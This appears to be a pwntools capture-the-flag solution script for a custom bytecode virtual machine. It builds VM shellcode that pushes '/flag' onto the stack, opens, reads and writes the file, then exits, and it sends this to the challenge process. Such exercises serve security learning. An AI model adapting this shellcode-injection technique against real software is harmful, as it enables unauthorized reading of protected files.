#!/usr/bin/python3
from pwn import *

context.binary = binary = ELF("???",checksec=False)
bin_path=("???")

gdb_script='''
set disassembly-flavor intel
display/8i $rip
display/x $rax
display/x $rbx
display/x $rcx
display/x $rdx
display/x $rdi
display/x $rsi
'''

p = process()
#p = gdb.debug(bin_path, gdbscript=gdb_script, terminal=['tmux', 'splitw', '-h'])

# registers
# 0x400; 0x08 = a
# 0x401; 0x40 = b
# 0x402; 0x20 = c
# 0x403; 0x01 = d
# 0x404; 0x10 = vstack pointer
# 0x405; 0x04 = i 
# 0x406; 0x02 = f
# reg|value|opcode
# endianess --> opc|val|reg

shellcode = ""

# constants
_open = ("100101") # store in register d
_read = ("100104") # store in register d
_write = ("102020")
_exit = ("100010")

flag = ["2f", "66", "6c", "61", "67", "00"] # '/flag\0'
psh_a = ("400800")
for v in flag:
    shellcode += "80"
    shellcode += v
    shellcode += "08"
    shellcode += psh_a

# open()
shellcode += "800108"   # imm a = 0x01
shellcode += "800040"   # imm b = 0x00
shellcode += _open      # syscall open()

# read()
shellcode += "800008"   # imm a = 0x00
shellcode += "080108"   # add a += d
shellcode += "800001"   # imm d = 0x00
shellcode += "80ff20"   # imm c = 0xff
shellcode += _read      # syscall read()

# write()
shellcode += "800108"   # imm a = 0x01
shellcode += "800020"   # imm c = 0x00
shellcode += "080120"   # add c += d
shellcode += _write     # syscall write()

# exit()
shellcode += _exit
shellcode = bytes.fromhex(shellcode)

p.recv()
p.sendline(shellcode)
p.interactive()
